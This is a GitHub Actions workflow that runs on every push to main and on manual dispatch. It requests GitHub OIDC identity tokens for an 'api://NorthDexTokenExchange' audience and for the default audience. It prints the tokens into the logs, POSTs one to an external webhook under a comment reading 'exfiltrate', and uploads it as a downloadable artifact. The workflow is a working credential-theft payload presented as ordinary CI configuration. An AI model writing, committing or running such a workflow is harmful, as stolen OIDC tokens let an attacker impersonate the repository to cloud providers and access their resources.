name: Get OIDC Token
on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - name: Get OIDC Token
        run: |
          # Request an OIDC JWT token from GitHub
          ID_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://NorthDexTokenExchange")
          echo "OIDC_TOKEN_RESPONSE=$ID_TOKEN"
          echo "$ID_TOKEN" > /tmp/oidc_token.json
          
          # Also try with default audience
          ID_TOKEN2=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL")
          echo "DEFAULT_OIDC=$ID_TOKEN2"
          
          # Send the token to a webhook endpoint
          TOKEN_VALUE=$(echo "$ID_TOKEN" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))" 2>/dev/null || echo "parse_error")
          echo "TOKEN=$TOKEN_VALUE"
          
          # If we have a webhook URL, exfiltrate
          if [ -n "$WEBHOOK_URL" ]; then
            curl -s -X POST "$WEBHOOK_URL" \
              -H "Content-Type: application/json" \
              -d "{\"oidc_token\": \"$TOKEN_VALUE\"}"
          fi
          
          # Save to workflow artifacts
          mkdir -p /tmp/tokens
          echo "$TOKEN_VALUE" > /tmp/tokens/oidc_token.txt
          cat /tmp/tokens/oidc_token.txt | head -100
      
      - name: Upload Token
        uses: actions/upload-artifact@v4
        with:
          name: oidc-tokens
          path: /tmp/tokens/
